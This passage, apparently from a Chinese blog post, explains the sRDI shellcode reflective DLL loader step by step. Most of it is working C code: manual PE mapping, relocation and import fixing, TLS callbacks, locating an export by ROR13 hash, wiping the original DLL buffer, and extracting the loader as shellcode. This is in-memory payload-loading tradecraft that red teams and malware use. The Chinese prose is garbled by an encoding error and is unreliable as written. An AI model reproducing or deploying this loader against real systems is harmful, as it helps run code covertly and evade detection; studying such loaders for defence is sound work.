è¿™ä¸ªç©ºé—´ä¹Ÿè¦å’Œç³»ç»Ÿçš„é¡µå¤§å° (dwPageSize) å¯¹é½

```
alignedImageSize = (DWORD)AlignValueUp(ntHeaders->OptionalHeader.SizeOfImage, sysInfo.dwPageSize);
```

æ¥ç€åˆ†é…ç©ºé—´ï¼Œå…ˆå°è¯•åˆ†é…åœ¨ pe å¤´æŒ‡å®šçš„åŸºå€ (`ntHeaders->OptionalHeader.ImageBase`) ä¸Šï¼Œå¦‚æœå¤±è´¥å†åˆ†åˆ°åˆ«å¤„

```
baseAddress = (ULONG_PTR)pVirtualAlloc(
		(LPVOID)(ntHeaders->OptionalHeader.ImageBase),
		alignedImageSize,
		MEM_RESERVE | MEM_COMMIT, PAGE_READWRITE
);

if (baseAddress == 0) {
    baseAddress = (ULONG_PTR)pVirtualAlloc(
        NULL,
        alignedImageSize,
        MEM_RESERVE | MEM_COMMIT, PAGE_READWRITE
    );
}
```

æ¥ç€åŸæ ·å¤åˆ¶ PE å¤´çš„æ•°æ®åˆ°`baseAddress`

å¯¹æˆ‘ä»¬æœ‰ç”¨çš„æ•°æ®åªæœ‰ PE å¤´ï¼ŒDOS å¤´å°±ä¸ç”¨å¤åˆ¶äº†

```
for (i = 0; i < ntHeaders->OptionalHeader.SizeOfHeaders; i++) {
	((PBYTE)baseAddress)[i] = ((PBYTE)dllData)[i];
}
```

### åŠ è½½ Section

```
///
	// STEP 3: Load in the sections
	///

	sectionHeader = IMAGE_FIRST_SECTION(ntHeaders);
	// è·å–sectionå¤´ä½ç½®

	for (i = 0; i < ntHeaders->FileHeader.NumberOfSections; i++, sectionHeader++) {
        // éå†æ¯ä¸ªsection
		for (c = 0; c < sectionHeader->SizeOfRawData; c++) {
			((PBYTE)(baseAddress + sectionHeader->VirtualAddress))[c] = ((PBYTE)(dllData + sectionHeader->PointerToRawData))[c];
            // æ–°çš„sectionå†…å­˜ä»åŸdllä¸­sectionHeader->PointerToRawData(åœ¨ç¡¬ç›˜çš„åç§»)ä¸€ä¸€å¤åˆ¶
		}
	}
```

### åŠ è½½é‡å®šå‘è¡¨

é‡å®šä½è¡¨çš„ä½œç”¨å°±æ˜¯ï¼šå½“å®é™…åŠ è½½åˆ°å†…å­˜ä¸­çš„ Imagebase ä¸æœ¬è¯¥åŠ è½½æ—¶å€™çš„ Imagebase åœ°å€ä¸åŒçš„æ—¶å€™ å°±éœ€è¦è¿›è¡Œä¿®å¤é‡å®šä½è¡¨

å…¶å®é‡å®šä½è¡¨ä¸­å­˜çš„æ˜¯**éœ€è¦ä¿®æ”¹çš„å‡½æ•°çš„åœ°å€åç§»**ï¼

é‡å®šå‘è¡¨çš„æ•°æ®ç»“æ„

```
typedef struct _IMAGE_BASE_RELOCATION {
    DWORD   VirtualAddress;   // è¡¨çš„èµ·å§‹ä½ç½®ï¼ˆRVAï¼‰
    DWORD   SizeOfBlock;      // é‡å®šä½å—çš„æ€»å¤§å°,éœ€è¦æ³¨æ„çš„æ˜¯è¿™é‡Œçš„sizeä¸æ˜¯1ä¸ª2ä¸ªçš„æ„æ€ï¼Œæ˜¯æ•´ä¸ªé‡å®šå‘è¡¨åœ¨å†…å­˜ä¸­çš„æ•°æ®é•¿åº¦å¤§å°
//  WORD    TypeOffset[1];
} IMAGE_BASE_RELOCATION;
```

é‡å®šå‘è¡¨ä¼šæœ‰å¤šä¸ªè¿™æ ·çš„ç»“æ„ï¼Œå¯ä»¥çœ‹åˆ°é‡å®šå‘è¡¨ä¸­æœ‰ä¸ªæ³¨é‡Šçš„`TypeOffset`ï¼Œè¿™æ˜¯é‡å®šå‘å—ï¼Œä¹Ÿå¯ä»¥çœ‹ä½œæ˜¯é‡å®šå‘è¡¨ä¸­ç»“æ„çš„ä¸€éƒ¨åˆ†ã€‚

é‡å®šå‘å—çš„ç»“æ„

```
typedef struct
{
	WORD	offset : 12;
	WORD	type : 4;
} IMAGE_RELOC, * PIMAGE_RELOC;
```

ä½œç”¨æ˜¯ä¸€äº›åç§»åœ°å€ï¼Œé‡å®šå‘å—æ˜¯ word ç±»å‹ï¼Œå®ƒä¹Ÿæ˜¯æ•°ç»„

å› ä¸º 1word=2byte=16bit

å®é™…ä¸Šæ•°æ®é¡¹åªæœ‰ ** å 12 ä½æ˜¯ç”¨æ¥è¡¨ç¤ºåç§» (IMAGE_RELOC->offset)** çš„ï¼Œ**é«˜ 4 ä½ç•™ä½œå®ƒç”¨ (IMAGE_RELOC->type)**

æ¯”å¦‚ï¼šå¯¹äºä¸€ä¸ªæ•°æ®é¡¹ä¸ºï¼š**0011** 0110 0001 0000 å…± 16 ä½ (2 å­—èŠ‚)

å…¶åç§»çš„æ•°å€¼ä¸ºï¼š0110 0001 0000 = 0x610

**å¦‚ä½•è¿›è¡Œä¿®å¤**

> é‡å®šä½è¡¨çš„ä½œç”¨å°±æ˜¯ï¼šå½“å®é™…åŠ è½½åˆ°å†…å­˜ä¸­çš„ Imagebase ä¸æœ¬è¯¥åŠ è½½æ—¶å€™çš„ Imagebase åœ°å€ä¸åŒçš„æ—¶å€™ å°±éœ€è¦è¿›è¡Œä¿®å¤é‡å®šä½è¡¨
> 
> å…¶å®é‡å®šä½è¡¨ä¸­å­˜çš„æ˜¯**éœ€è¦ä¿®æ”¹çš„å‡½æ•°çš„åœ°å€åç§»**ï¼

æ‰€ä»¥é‡å®šä½è¡¨ä¸­æ‰€è¡¨ç¤ºçš„åœ°å€ (`IMAGE_BASE_RELOCATION->VirtualAddress+IMAGE_RELOC->offset`) åŸæ¥æ˜¯ä¸€ä¸ªå†™æ­»çš„å€¼ (ç›¸å¯¹äºåŸåŸºå€`ntHeaders->OptionalHeader.ImageBase`)ã€‚

æˆ‘ä»¬çš„ä¿®å¤å°±æ˜¯å°†è¿™ä¸ªåœ°å€ä¸Šçš„å€¼å‡å»åŸæ¥çš„åŸºå€ï¼ŒåŠ ä¸Šæˆ‘ä»¬æ–°çš„åŸºå€å³å¯ã€‚ç„¶åæ ¹æ®ç”µè„‘çš„å¤§å°ç«¯ç±»å‹åˆ†åˆ«å­˜å‚¨å³å¯ã€‚

**å¤„ç†ä»£ç **

```
baseOffset = baseAddress - ntHeaders->OptionalHeader.ImageBase;
dataDir = &ntHeaders->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC];

if (baseOffset && dataDir->Size) {

    relocation = RVA(PIMAGE_BASE_RELOCATION, baseAddress, dataDir->VirtualAddress);

    while (relocation->VirtualAddress) {
        relocList = (PIMAGE_RELOC)(relocation + 1);

        while ((PBYTE)relocList != (PBYTE)relocation + relocation->SizeOfBlock) {

            if (relocList->type == IMAGE_REL_BASED_DIR64)
                *(PULONG_PTR)((PBYTE)baseAddress + relocation->VirtualAddress + relocList->offset) += baseOffset;
            else if (relocList->type == IMAGE_REL_BASED_HIGHLOW)
                *(PULONG_PTR)((PBYTE)baseAddress + relocation->VirtualAddress + relocList->offset) += (DWORD)baseOffset;
            else if (relocList->type == IMAGE_REL_BASED_HIGH)
                *(PULONG_PTR)((PBYTE)baseAddress + relocation->VirtualAddress + relocList->offset) += HIWORD(baseOffset);
            else if (relocList->type == IMAGE_REL_BASED_LOW)
                *(PULONG_PTR)((PBYTE)baseAddress + relocation->VirtualAddress + relocList->offset) += LOWORD(baseOffset);

            relocList++;
        }
        relocation = (PIMAGE_BASE_RELOCATION)relocList;
    }
}
```

### åŠ è½½å¯¼å…¥è¡¨

å¯¼å…¥è¡¨çš„æ•°æ®ç»“æ„

```
typedef struct _IMAGE_IMPORT_DESCRIPTOR {
    union {
        DWORD   Characteristics;            // æ ‡å¿— ä¸º0è¡¨ç¤ºç»“æŸ æ²¡æœ‰å¯¼å…¥æè¿°ç¬¦äº†
        DWORD   OriginalFirstThunk;         // RVAåœ°å€ï¼ŒæŒ‡å‘IMAGE_THUNK_DATAç»“æ„æ•°ç»„,æŒ‡å‘çš„åœ°å€åˆ—è¡¨è¢«å®šä¹‰ä¸ºï¼šINTï¼ˆImport Name Tableï¼‰ å¯¼å…¥åç§°è¡¨
    };
    DWORD   TimeDateStamp;                  // æ—¶é—´æˆ³ï¼Œä¸€èˆ¬ä¸ç”¨ï¼Œå¤§å¤šæƒ…å†µä¸‹éƒ½ä¸º0ã€‚å¦‚æœè¯¥å¯¼å…¥è¡¨é¡¹è¢«ç»‘å®šï¼Œé‚£ä¹ˆç»‘å®šåçš„è¿™ä¸ªæ—¶é—´æˆ³å°±è¢«è®¾ç½®ä¸ºå¯¹åº”DLLæ–‡ä»¶çš„æ—¶é—´æˆ³ã€‚æ“ä½œç³»ç»Ÿåœ¨åŠ è½½æ—¶ï¼Œå¯ä»¥é€šè¿‡è¿™ä¸ªæ—¶é—´æˆ³æ¥åˆ¤æ–­ç»‘å®šçš„ä¿¡æ¯æ˜¯å¦è¿‡æ—¶
    DWORD   ForwarderChain;                 // é“¾è¡¨çš„å‰ä¸€ä¸ªç»“æ„
    DWORD   Name;                           // RVAï¼ŒæŒ‡å‘DLLåå­—ï¼Œè¯¥åå­—ä»¥''\0''ç»“å°¾
    DWORD   FirstThunk;                     // RVAåœ°å€ï¼ŒæŒ‡å‘IMAGE_THUNK_DATAç»“æ„æ•°ç»„,ä¸OriginalFirstThunkç›¸åŒï¼Œå®ƒæŒ‡å‘çš„é“¾è¡¨å®šä¹‰äº†é’ˆå¯¹Nameè¿™ä¸ªåŠ¨æ€é“¾æ¥åº“å¼•å…¥çš„æ‰€æœ‰å¯¼å…¥å‡½æ•°,æ‰€æŒ‡å‘çš„åœ°å€åˆ—è¡¨è¢«å®šä¹‰ä¸ºï¼šIATï¼ˆImport Adress Tableï¼‰ å¯¼å…¥åœ°å€è¡¨
} IMAGE_IMPORT_DESCRIPTOR;
```

çœ‹åˆ°`originalFirstThunk`å’Œ`FirstThunk`éƒ½æŒ‡å‘äº†ä¸€ä¸ªæ•°æ®ç»“æ„`IMAGE_THUNK_DATA`

```
typedef struct _IMAGE_THUNK_DATA64 {
    union {
        ULONGLONG ForwarderString;  // PBYTE 
        ULONGLONG Function;         // PDWORD
        ULONGLONG Ordinal;
        ULONGLONG AddressOfData;    // PIMAGE_IMPORT_BY_NAME
    } u1;
} IMAGE_THUNK_DATA64;
```

è¿™ä¸ªæ•°æ®ç»“æ„å°±æ˜¯ä¸€ä¸ª ULONGLONG ç±»å‹ï¼Œåœ¨ 32 ä½ä¸‹æ˜¯ dword ç±»å‹ï¼Œä½†åœ¨ä¸åŒçš„æ—¶åˆ»å´æ‹¥æœ‰ä¸åŒçš„è§£é‡Š

IMAGE_THUNK_DATA æœ‰**ä¸¤ç§è§£é‡Š**ï¼š

*   DWORD æœ€é«˜ä½ä¸º 0ï¼Œé‚£ä¹ˆè¯¥æ•°å€¼æ˜¯ä¸€ä¸ª RVAï¼ŒæŒ‡å‘_IMAGE_IMPORT_BY_NAME ç»“æ„ï¼Œè¡¨æ˜å‡½æ•°æ˜¯**ä»¥å­—ç¬¦ä¸²ç±»å‹çš„å‡½æ•°åå¯¼å…¥**çš„
    

*   ```
    typedef struct _IMAGE_IMPORT_BY_NAME {
        WORD    Hint;
        BYTE    Name[1];
    } IMAGE_IMPORT_BY_NAME, *PIMAGE_IMPORT_BY_NAME;
    ```
    
*   è¯¥ç»“æ„å³ä¸ºï¼š"ç¼–å·â€”åç§°"ï¼ˆHint/Nameï¼‰æè¿°éƒ¨åˆ†
    
*   Hintï¼šå¯¼å‡ºå‡½æ•°åœ°å€è¡¨çš„**ç´¢å¼•ç¼–å·**ï¼Œå¯èƒ½ä¸ºç©ºä¸”**ä¸ä¸€å®šå‡†ç¡®**ï¼Œç”±ç¼–è¯‘å™¨å†³å®šï¼Œä¸€èˆ¬ä¸ä½¿ç”¨è¯¥å€¼
    
*   Nameï¼šè¿™ä¸ªæ˜¯ä¸€ä¸ªä»¥ "\0" ç»“å°¾çš„å­—ç¬¦ä¸²ï¼Œè¡¨ç¤ºå‡½æ•°å
    
*   _IMAGE_IMPORT_BY_NAME ç»“æ„ï¼š
    

*   DWORD æœ€é«˜ä½ä¸º 1ï¼Œé‚£ä¹ˆè¯¥æ•°å€¼çš„ä½ 31 ä½å°±æ˜¯å‡½æ•°çš„**å¯¼å‡ºå‡½æ•°çš„åºå·**
    

ä¸ºä»€ä¹ˆä¸¤ä¸ªå‚æ•°æè¿°åŒä¸€ä¸ªæ•°æ®ç»“æ„`IMAGE_THUNK_DATA`å‘¢ï¼Œè¿™æ¶‰åŠåˆ°ä¸€ä¸ª PE æ–‡ä»¶åŠ è½½å‰åçš„å¯¹æ¯”

**PE åŠ è½½å‰åå¯¹æ¯”**

*   åœ¨ PE æ–‡ä»¶åŠ è½½å‰ï¼š`OriginalFirstThunk`æŒ‡å‘çš„ INT å’Œ`FirstThunk`æŒ‡å‘çš„ IAT çš„æ•°æ®å€¼æ˜¯**ç›¸åŒ**çš„ï¼Œä½†æ˜¯å…¶**å­˜å‚¨ä½ç½®æ˜¯ä¸åŒçš„**
    
*   åœ¨ PE æ–‡ä»¶åŠ è½½åï¼š`OriginalFirstThunk`æŒ‡å‘çš„ INT **ä¸å˜**ï¼Œä½†`FirstThunk`æŒ‡å‘çš„ IAT çš„æ•°æ®å€¼**å˜ä¸ºäº†å‡½æ•°ç›¸åº”çš„ RVA åœ°å€**
    

PSï¼šå‡½æ•°ç›¸åº”çš„ RVA åœ°å€æ˜¯æ ¹æ® IAT ä¸­çš„å‡½æ•°åç§°æˆ–è€…å¯¼å‡ºè¡¨ä¸­çš„åºå·è·å¾—çš„

æ‰€ä»¥`åŠ è½½å¯¼å…¥è¡¨`çš„è¿‡ç¨‹ï¼Œå°±æ˜¯æ¨¡æ‹Ÿ PE åŠ è½½å™¨ï¼Œæ ¹æ®å¯¼å…¥è¡¨ï¼Œä¾æ¬¡åŠ è½½å¯¹åº” dllï¼Œè·å–å¯¼å‡ºå‡½æ•°ï¼Œå¹¶å°†å‡½æ•°è™šæ‹Ÿåœ°å€ (rva) æ”¾åˆ°`FirstThunk`ã€‚

åŠ è½½å‡½æ•°æ ¹æ®å®šä¹‰ï¼Œä½¿ç”¨`pLdrGetProcAddress`æŒ‰ç…§åºå·æˆ–è€…åç§°åŠ è½½

```
dataDir = &ntHeaders->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_IMPORT];
// ä»æ•°æ®ç›®å½•è·å–å¯¼å…¥è¡¨ç»“æ„
randSeed = (DWORD)((ULONGLONG)dllData);

if (dataDir->Size) {
    importDesc = RVA(PIMAGE_IMPORT_DESCRIPTOR, baseAddress, dataDir->VirtualAddress);
    for (; importDesc->Name; importDesc++) {

        library = pLoadLibraryA((LPSTR)(baseAddress + importDesc->Name));

        firstThunk = RVA(PIMAGE_THUNK_DATA, baseAddress, importDesc->FirstThunk);
        origFirstThunk = RVA(PIMAGE_THUNK_DATA, baseAddress, importDesc->OriginalFirstThunk);

        for (; origFirstThunk->u1.Function; firstThunk++, origFirstThunk++) {

            if (IMAGE_SNAP_BY_ORDINAL(origFirstThunk->u1.Ordinal)) {
                pLdrGetProcAddress(library, NULL, (WORD)origFirstThunk->u1.Ordinal, (PVOID *)&(firstThunk->u1.Function));
            }
            else {
                importByName = RVA(PIMAGE_IMPORT_BY_NAME, baseAddress, origFirstThunk->u1.AddressOfData);
                FILL_STRING(aString, importByName->Name);
                pLdrGetProcAddress(library, &aString, 0, (PVOID*)&(firstThunk->u1.Function));
            }
        }
    }
}
```

### åŠ è½½å»¶è¿Ÿå¯¼å…¥è¡¨

å»¶è¿ŸåŠ è½½å¯¼å…¥è¡¨å’Œå¯¼å…¥è¡¨ç¤ºç›¸äº’åˆ†ç¦»çš„ï¼Œå»¶è¿ŸåŠ è½½å¯¼å…¥è¡¨æ˜¯ç‰¹æ®Šçš„å¯¼å…¥è¡¨ï¼Œå’Œå¯¼å…¥è¡¨ä¸åŒçš„æ˜¯ï¼Œå»¶è¿ŸåŠ è½½å¯¼å…¥è¡¨æ‰€è®°å½•çš„ dll ä¸ä¼šè¢«æ“ä½œç³»ç»ŸåŠ è½½ï¼Œåªæœ‰åœ¨å‡½æ•°è¢«åº”ç”¨ç¨‹åºè°ƒç”¨çš„æ—¶å€™ï¼ŒPE ä¸­æ³¨å†Œçš„å»¶è¿ŸåŠ è½½å‡½æ•°æ‰ä¼šæ ¹æ®å»¶è¿ŸåŠ è½½å¯¼å…¥è¡¨çš„è®°å½•ï¼ŒåŠ¨æ€åŠ è½½ dllï¼Œä»¥åŠä¿®æ­£å¯¼å…¥å‡½æ•°çš„ VAã€‚

å»¶è¿ŸåŠ è½½ç”±äºæ²¡æœ‰åœ¨ç¨‹åºåˆå§‹åŒ–çš„æ—¶å€™åˆå§‹åŒ– dllï¼Œåªæ˜¯ä¼šåœ¨åº”ç”¨ç¨‹åºè°ƒç”¨æŸä¸ªæ¨¡å—çš„æ—¶å€™åŠ è½½è¯¥æ¨¡å—ï¼Œæ‰€ä»¥ä½¿ç”¨å»¶è¿ŸåŠ è½½æŠ€æœ¯çš„ç¨‹åºæ‹¥æœ‰æ›´é«˜çš„åˆå§‹åŒ–é€Ÿåº¦ã€‚

è¡¨ç»“æ„

```
typedef struct _IMAGE_DELAYLOAD_DESCRIPTOR {
    union {
        DWORD AllAttributes;
        struct {
            DWORD RvaBased : 1;             // Delay load version 2
            DWORD ReservedAttributes : 31;
        } DUMMYSTRUCTNAME;
    } Attributes;

    DWORD DllNameRVA;                       // RVA to the name of the target library (NULL-terminate ASCII string)
    DWORD ModuleHandleRVA;                  // RVA to the HMODULE caching location (PHMODULE)
    DWORD ImportAddressTableRVA;            // RVA to the start of the IAT (PIMAGE_THUNK_DATA)
    DWORD ImportNameTableRVA;               // RVA to the start of the name table (PIMAGE_THUNK_DATA::AddressOfData)
    DWORD BoundImportAddressTableRVA;       // RVA to an optional bound IAT
    DWORD UnloadInformationTableRVA;        // RVA to an optional unload info table
    DWORD TimeDateStamp;                    // 0 if not bound,
                                            // Otherwise, date/time of the target DLL

} IMAGE_DELAYLOAD_DESCRIPTOR, *PIMAGE_DELAYLOAD_DESCRIPTOR;
```

ç›´æ¥æŒ‰ç…§åŠ è½½å¯¼å…¥è¡¨çš„æ–¹å¼åŠ è½½å³å¯

```
dataDir = &ntHeaders->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_DELAY_IMPORT];

if (dataDir->Size) {
    delayDesc = RVA(PIMAGE_DELAYLOAD_DESCRIPTOR, baseAddress, dataDir->VirtualAddress);

    for (; delayDesc->DllNameRVA; delayDesc++) {

        library = pLoadLibraryA((LPSTR)(baseAddress + delayDesc->DllNameRVA));

        firstThunk = RVA(PIMAGE_THUNK_DATA, baseAddress, delayDesc->ImportAddressTableRVA);
        origFirstThunk = RVA(PIMAGE_THUNK_DATA, baseAddress, delayDesc->ImportNameTableRVA);

        for (; firstThunk->u1.Function; firstThunk++, origFirstThunk++) {
            if (IMAGE_SNAP_BY_ORDINAL(origFirstThunk->u1.Ordinal)) {
                pLdrGetProcAddress(library, NULL, (WORD)origFirstThunk->u1.Ordinal, (PVOID *)&(firstThunk->u1.Function));
            }
            else {
                importByName = RVA(PIMAGE_IMPORT_BY_NAME, baseAddress, origFirstThunk->u1.AddressOfData);
                FILL_STRING(aString, importByName->Name);
                pLdrGetProcAddress(library, &aString, 0, (PVOID *)&(firstThunk->u1.Function));
            }
        }
    }
}
```

### åˆ†é…æ®µçš„å†…å­˜å±æ€§

```
sectionHeader = IMAGE_FIRST_SECTION(ntHeaders);

for (i = 0; i < ntHeaders->FileHeader.NumberOfSections; i++, sectionHeader++) {

    if (sectionHeader->SizeOfRawData) {

        // determine protection flags based on characteristics
        executable = (sectionHeader->Characteristics & IMAGE_SCN_MEM_EXECUTE) != 0;
        readable = (sectionHeader->Characteristics & IMAGE_SCN_MEM_READ) != 0;
        writeable = (sectionHeader->Characteristics & IMAGE_SCN_MEM_WRITE) != 0;

        if (!executable && !readable && !writeable)
            protect = PAGE_NOACCESS;
        else if (!executable && !readable && writeable)
            protect = PAGE_WRITECOPY;
        else if (!executable && readable && !writeable)
            protect = PAGE_READONLY;
        else if (!executable && readable && writeable)
            protect = PAGE_READWRITE;
        else if (executable && !readable && !writeable)
            protect = PAGE_EXECUTE;
        else if (executable && !readable && writeable)
            protect = PAGE_EXECUTE_WRITECOPY;
        else if (executable && readable && !writeable)
            protect = PAGE_EXECUTE_READ;
        else if (executable && readable && writeable)
            protect = PAGE_EXECUTE_READWRITE;

        if (sectionHeader->Characteristics & IMAGE_SCN_MEM_NOT_CACHED) {
            protect |= PAGE_NOCACHE;
        }

        // change memory access flags
        pVirtualProtect(
            (LPVOID)(baseAddress + sectionHeader->VirtualAddress),
            sectionHeader->SizeOfRawData,
            protect, &protect
        );
    }

}
```

### æ‰§è¡Œ TLS å›è°ƒ

TLS å³ Thread Local Storageï¼Œçº¿ç¨‹å±€éƒ¨å­˜å‚¨ã€‚æ‰§è¡Œ TLS å›è°ƒå‡½æ•°å¯ä»¥ç†è§£ä¸ºç¼–ç¨‹è¯­è¨€ä¸­çš„ææ„å‡½æ•°ã€‚

```
typedef struct _IMAGE_TLS_DIRECTORY64 {
    ULONGLONG StartAddressOfRawData;
    ULONGLONG EndAddressOfRawData;
    ULONGLONG AddressOfIndex;         // PDWORD
    ULONGLONG AddressOfCallBacks;     // PIMAGE_TLS_CALLBACK *;
    DWORD SizeOfZeroFill;
    union {
        DWORD Characteristics;
        struct {
            DWORD Reserved0 : 20;
            DWORD Alignment : 4;
            DWORD Reserved1 : 8;
        } DUMMYSTRUCTNAME;
    } DUMMYUNIONNAME;

} IMAGE_TLS_DIRECTORY64;
```

å›è°ƒå‡½æ•°çš„å®šä¹‰

```
//
// Thread Local Storage
//

typedef VOID
(NTAPI *PIMAGE_TLS_CALLBACK) (
    PVOID DllHandle,
    DWORD Reason,
    PVOID Reserved
);
```

æ‰§è¡Œ tls callback ä»£ç 

```
///
// STEP 8: Execute TLS callbacks
///

dataDir = &ntHeaders->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_TLS];

if (dataDir->Size)
{
    tlsDir = RVA(PIMAGE_TLS_DIRECTORY, baseAddress, dataDir->VirtualAddress);
    callback = (PIMAGE_TLS_CALLBACK *)(tlsDir->AddressOfCallBacks);

    for (; *callback; callback++) {
        (*callback)((LPVOID)baseAddress, DLL_PROCESS_ATTACH, NULL);
    }
}
```

### æ³¨å†Œå¼‚å¸¸å¤„ç† (ä»…åœ¨ 64 ä½)

x86 ç³»ç»Ÿé‡‡ç”¨åŠ¨æ€çš„æ–¹å¼æ„å»º SEH ç»“æ„ï¼Œç›¸æ¯”è€Œè¨€ x64 ç³»ç»Ÿä¸‹é‡‡ç”¨é™æ€çš„æ–¹å¼å¤„ç† SEH ç»“æ„ï¼Œå®ƒä¿å­˜åœ¨ PE æ–‡ä»¶ä¸­ï¼Œé€šå¸¸åœ¨. pdata åŒºæ®µã€‚æ•°æ®ç›®å½•é¡¹çš„ç¬¬ä¸‰ä¸ªã€‚

ç»“æ„

```
typedef struct_IMAGE_IA64_RUNTIME_FUNCTION_ENTRY {

Â Â Â DWORD BeginAddress;Â Â  //ä¸SEHç›¸å…³ä»£ç çš„èµ·å§‹åç§»åœ°å€

Â Â Â DWORD EndAddress;Â Â Â Â Â  //ä¸SEHç›¸å…³ä»£ç çš„æœ«å°¾åç§»åœ°å€

Â Â Â DWORD UnwindInfoAddress;//æŒ‡å‘æè¿°ä¸Šé¢ä¸¤ä¸ªå­—æ®µä¹‹é—´ä»£ç å¼‚å¸¸ä¿¡æ¯çš„UNWIND_INFO

} IMAGE_IA64_RUNTIME_FUNCTION_ENTRY,*PIMAGE_IA64_RUNTIME_FUNCTION_ENTRY;
```

ä»£ç 

```
#ifdef _WIN64
	dataDir = &ntHeaders->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXCEPTION];

	if (pRtlAddFunctionTable && dataDir->Size)
	{
		rfEntry = RVA(PIMAGE_RUNTIME_FUNCTION_ENTRY, baseAddress, dataDir->VirtualAddress);
		pRtlAddFunctionTable(rfEntry, (dataDir->Size / sizeof(IMAGE_RUNTIME_FUNCTION_ENTRY)) - 1, baseAddress);
	}
#endif
```

ä½¿ç”¨ RtlAddFunctionTable è®¾ç½®å¼‚å¸¸å¤„ç†ï¼ˆSEHï¼‰

### è°ƒç”¨ dllMain

```
///
// STEP 10: call our images entry point
///

dllMain = RVA(DLLMAIN, baseAddress, ntHeaders->OptionalHeader.AddressOfEntryPoint);
dllMain((HINSTANCE)baseAddress, DLL_PROCESS_ATTACH, (LPVOID)1);
```

ä½¿ç”¨ DLL_PROCESS_ATTACH ä¸ºå‚æ•°, è°ƒç”¨ DLL å…¥å£ç‚¹ã€‚

### è°ƒç”¨æŒ‡å®šå‡½æ•°

éå†å¯¼å‡ºè¡¨ï¼Œè®¡ç®— funchash å¹¶åŒ¹é…

```
///
// STEP 11: call our exported function
///

if (dwFunctionHash) {

    do
    {
        dataDir = &ntHeaders->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT];
        if (!dataDir->Size)
            break;

        exportDir = (PIMAGE_EXPORT_DIRECTORY)(baseAddress + dataDir->VirtualAddress);
        if (!exportDir->NumberOfNames || !exportDir->NumberOfFunctions)
            break;

        expName = RVA(PDWORD, baseAddress, exportDir->AddressOfNames);
        expOrdinal = RVA(PWORD, baseAddress, exportDir->AddressOfNameOrdinals);

        for (i = 0; i < exportDir->NumberOfNames; i++, expName++, expOrdinal++) {

            expNameStr = RVA(LPCSTR, baseAddress, *expName);
            funcHash = 0;

            if (!expNameStr)
                break;

            for (; *expNameStr; expNameStr++) {
                funcHash += *expNameStr;
                funcHash = ROTR32(funcHash, 13);

            }

            if (dwFunctionHash == funcHash && expOrdinal)
            {
                exportFunc = RVA(EXPORTFUNC, baseAddress, *(PDWORD)(baseAddress + exportDir->AddressOfFunctions + (*expOrdinal * 4)));
                exportFunc(lpUserData, nUserdataLen);
                break;
            }
        }
    } while (0);
}
```

### æ¸…é™¤æ‰åŸ dll å†…å­˜

```
if (flags & SRDI_CLEARMEMORY && pVirtualFree && pLocalFree) {
    if (!pVirtualFree((LPVOID)dllData, 0, 0x8000))
        pLocalFree((LPVOID)dllData);
}
```

### å°†åå°„ dll è½¬æ¢ä¸º shellcode

**ç¼–è¯‘é¡ºåº**

![](https://mmbiz.qpic.cn/mmbiz_png/eLgL5R4W3FhRWOOMKPEl3xFkBicJefERleQHHkNPjvlJX2wgUlHaAiblzf3YHf0HGzbsPOqxwK0RuzIh2ubue0lw/640?wx_fmt=png)image-20210412175535345

function_link_order.txt

```
LoadDLL
GetProcAddressWithHash
```

æŒ‡å®š LoadDLL é¦–å…ˆç¼–è¯‘

**åˆ†ç¦» shellcode**

![](https://mmbiz.qpic.cn/mmbiz_png/eLgL5R4W3FhRWOOMKPEl3xFkBicJefERlVygdNx8VETRKJEyokCKt3wicY6s7OC1cqRCCcPV3tDZTPAaTb75NAMQ/640?wx_fmt=png)image-20210412150605149

é€šè¿‡ä¸€ä¸ª powershell è„šæœ¬ï¼Œåˆ†ç¦»å‡º. text æ®µçš„å†…å®¹ï¼Œå³æ˜¯æˆ‘ä»¬éœ€è¦çš„ shellcode äº†ï¼Œè¿™ä¸ª shellcode å¼€å¤´å°±æ˜¯`LoadDLL`çš„å‡½æ•°è°ƒç”¨ã€‚

ç„¶åå†ç”¨æ±‡ç¼–ç¼–å†™ä¸€æ®µè°ƒç”¨çš„ä»£ç å°±å¯ä»¥è¿è¡Œäº†ï¼Œè¿™ä¸ªä»£ç æˆ‘ä»¬å¯ä»¥å« bootstrapã€‚

psï¼šå¦‚ä½•å°† c å†™çš„ä»£ç è½¬æ¢ä¸º shellcodeï¼Œä¸è¦ä½¿ç”¨ windows æä¾›çš„ apiï¼Œä½¿ç”¨åŠ¨æ€åŠ è½½çš„æ–¹å¼è°ƒç”¨ã€‚ä¹Ÿè¦é˜²æ­¢ç¼–è¯‘å™¨è‡ªå·±çš„ä¼˜åŒ–ã€‚

srdi æä¾›äº†ä¸€ä¸ª shellcode ç”Ÿæˆè„šæœ¬ï¼Œåœ¨`Python\ShellcodeRDI.py`ï¼Œå† ida ä¸‹åˆ†æä¸‹ shellcodeï¼ˆåœ¨ x64 ä¸‹ï¼‰

![](https://mmbiz.qpic.cn/mmbiz_png/eLgL5R4W3FhRWOOMKPEl3xFkBicJefERlSuJAdroHENty1xKZpcsVKkCJbWe7Hkfo2350x34uZB2T8cSobmBiaoA/640?wx_fmt=png)image-20210412180656666

```
ULONG_PTR LoadDLL(PBYTE dllData, DWORD dwFunctionHash, LPVOID lpUserData, DWORD nUserdataLen, DWORD flags)
```

æ•´ä¸ªç¨‹åºåœ¨å†…å­˜ä¸­æ˜¯è¿™æ ·çš„

```
# Bootstrap shellcode
# RDI shellcode
# DLL bytes
# User data
```

End
---

